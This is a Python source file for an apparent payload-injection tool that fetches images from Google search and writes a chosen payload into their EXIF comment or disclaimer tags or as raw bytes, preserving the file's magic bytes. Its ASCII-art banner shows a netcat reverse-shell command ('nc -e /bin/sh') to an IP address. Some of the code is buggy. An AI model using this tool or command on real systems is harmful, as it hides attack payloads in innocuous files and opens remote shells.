#!/usr/bin/env python

from bs4 import BeautifulSoup
import chardet
from dataclasses import dataclass, field
from dataclasses_json import dataclass_json
from enum import Enum
from exiftool import ExifToolHelper
from io import BytesIO
from pyfiglet import Figlet
from random import randint
from tabulate import tabulate
from termcolor import cprint
from types import FunctionType
from typing import List, Any
import mimetypes
import os
import re
import requests
import shutil
import sys


import interface
import config as conf
config = conf.load()


# Configs
BANNER = '''
          ____               __          _       _ 
         / __ \_____        / /   __  __(_)___ _(_)
        / / / / ___/       / /   / / / / / __ `/ / 
       / /_/ / /   _      / /___/ /_/ / / /_/ / /  
      /_____/_/   (_)    /_____/\__,_/_/\__, /_/       
                                      /____/   
              .----------------------------------|    (   
-----========| .....nc -e /bin/sh 10.6.6.6 1337 ######|
:             `----------------------------------|    )
.'''

@dataclass
class Injector:
    """Injector Parent Class."""
   
    filepath: str
    method: str | None = None

    def load_method(self, suffix):
        method = f"inject_{suffix}"
        self.method = method if method in self.methods() else None

    # Possible misuse of classmethod...
    @classmethod
    def methods(cls):
        return [method for method in dir(cls) if method.startswith('inject')]


@dataclass_json
@dataclass
class Image(Injector):
    """Image class inherits from."""

    def load_exif(self):
        with ExifToolHelper() as et:
            self.exifdata = et.get_metadata(self.filepath)[0]

    @staticmethod
    def inject_comment(image, payload):
        with ExifToolHelper() as et:
            et.set_tags(image, tags={"comment": payload})

    @staticmethod
    def inject_disclaimer(image, payload):
        with ExifToolHelper() as et:
            et.set_tags(image, tags={"disclaimer": payload})

    @staticmethod
    def inject_raw(image, payload, offset=14):
        """Inject raw bytes into file starting at offset.
           Default offset is 14 to preserve magic bytes for most image formats.
        """
        pbytes = payload.encode()
        start = offset
        end = start + len(pbytes)

        with open(image, 'rb') as f:
            bstream = f.read()

        buff = BytesIO(bstream)
        view = buff.getbuffer()
        view[start:end] = pbytes

        with open(image, 'wb') as f:
            f.write(buff.getvalue())


@dataclass
class Search:
    """Parent class for search engine classes."""
    query: str
    srchmode: str
    url: Any = None

    @staticmethod
    def random_url(urls, start=0):
        """Get range of array and return random element in that range."""
        end = len(urls) - 1
        return urls[randint(start, end)]

    @staticmethod
    def first_url(urls):
        """Return the first url in the list."""
        return urls[0]

    @staticmethod
    def smallest_image_url(urls):
        """Returns the url with smallest content length."""
        def content_length(u): 
            return int((requests.request.get(u, stream=True).headers.get('Content-Length')))    # Helper function to make dict comprehension more readable.
        lookup_table = {url: content_length(url) for url in urls}
        return min(lookup_table, key=lookup_table['url'])       


@dataclass
class Google(Search):
    """Google search engine class."""

    lang: str = "en"
    safe: str = "on"
    srch: str = "&tbm=isch"     # TODO need to work out an easier to interface attribute.
    root: str = "https://www.google.com/search?"

    def __post_init__(self):

        uri = f"{self.root}hl={self.lang}&q={self.query}&safe={self.safe}{self.srch}"
        header = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(uri, header)
        html = str(BeautifulSoup(response.content, features="lxml"))

        # Filter URL results
        pattern = r"src=\"(https://[a-zA-Z0-9-.?=&;:/]+)\""
        self.select(re.findall(pattern, html))

    def select(self, urls):
        if self.srchmode == 'random':
            self.url = self.random_url(urls)
        elif self.srchmode == 'first':
            self.url = self.first_url(urls)
        elif self.srchmode == 'smallest':
            self.url = self.smallest_image_url(urls)


def load(filepath):

    absbpath = os.path.abspath(filepath)

    with open(absbpath, 'rb') as f:
        return f

            
def search(query, searchtype, searchmode, searchdir):
    """Accepts a query and a filename."""

    searchquery = Google(query, searchmode)
    response = requests.get(searchquery.url, stream=True)
    content_type = response.headers.get('Content-Type')
    exts = mimetypes.guess_all_extensions(content_type, strict=False)
    
    # Get preferred extension based on EXTENSIONS config.
    preferred = config['extension']['image']
    ext = [e.strip('.') for e in exts if e.strip('.') in preferred][0]

    # Write to filepath.
    # try to drop extenstion if included in query
    name = searchquery.query.split(".")[0]
    dir = os.path.abspath(searchdir)

    if not os.path.isdir(dir):
        os.makedirs(dir, exist_ok=False)

    filepath = f"{dir}/{name}.{ext}"
    
    if response.status_code == 200:
        with open(filepath, 'wb') as f:
            shutil.copyfileobj(response.raw, f)

    if searchtype == "image":
        obj = Image(filepath)
    elif searchtype == "pdf":
        print("Nonexistant feature")
        exit()
        # obj = Pdf(filepath)
    elif searchtype == "rtf":
        print("Nonexistant feature")
        exit()
        # obj = Rtf(filepath)
    else:
        print("Nonexistant feature")
        exit()    

    return obj 


def inject(obj, injection_method, payload):
    """Accepts a filename, payload, and method.
       Injects the payload into image file based on the selected method.

       TODO: re-design class structure between injector and image classes
       to avoid calling obj.load_exif.
    """

    # Load method
    obj.load_method(injection_method)    
    obj.load_exif()  

    # Call injection method by reference.
    getattr(obj, obj.method)(obj.filepath, payload)
    obj.load_exif()

    return obj


if __name__ == "__main__":

    args = interface.parser()

    # Throw usage if no positional arguments are given.
    if len(sys.argv) == 1:
        args.usage(args)

    if args.debug:
        print(args)
        quit()

    method = (args._get_kwargs()[-1][-1])

    if args.output is None:
        outfile = os.getcwd()
    if args.query:
        artifact = search(args.query, args.type, args.searchmode, outfile)

    # TODO need a function for args.url
    result = inject(artifact, method, args.payload)

    if args.type == 'image': 
        output = [[k,v] for k, v in result.exifdata.items()]
    
           
    cprint(BANNER, 'green')
    print(tabulate(output))